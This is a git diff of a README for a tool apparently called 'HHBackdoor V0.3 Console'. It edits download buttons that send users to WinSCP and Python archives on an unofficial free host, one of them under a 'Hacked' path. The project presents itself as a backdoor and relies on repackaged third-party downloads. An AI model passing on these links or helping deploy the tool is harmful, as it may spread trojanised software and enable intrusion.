@@ -16,7 +16,7 @@ You will need to download Winscp&Pyhton here and put it in HHBackdoor V0.3 Conso
 ## Winscp
 
 <a download="http://pcprotect.eu5.org/download.png" href="http://pcprotect.eu5.org/Winscp.zip" >
-    <img alt="Download" src="http://pcprotect.eu5.org/Winscp.zip">
+    <img alt="Download" src="http://pcprotect.eu5.org/download.png">
 </a>
 
 ## Python
@@ -30,5 +30,5 @@ You will need to download Winscp&Pyhton here and put it in HHBackdoor V0.3 Conso
 ### Python part 2 
 
 <a download="http://pcprotect.eu5.org/Hacked/python2.zip" href="http://pcprotect.eu5.org/Hacked/python2.zip" >
-    <img alt="Download" src="http://pcprotect.eu5.org/Winscp.zip">
+    <img alt="Download" src="http://pcprotect.eu5.org/download.png">
 </a>
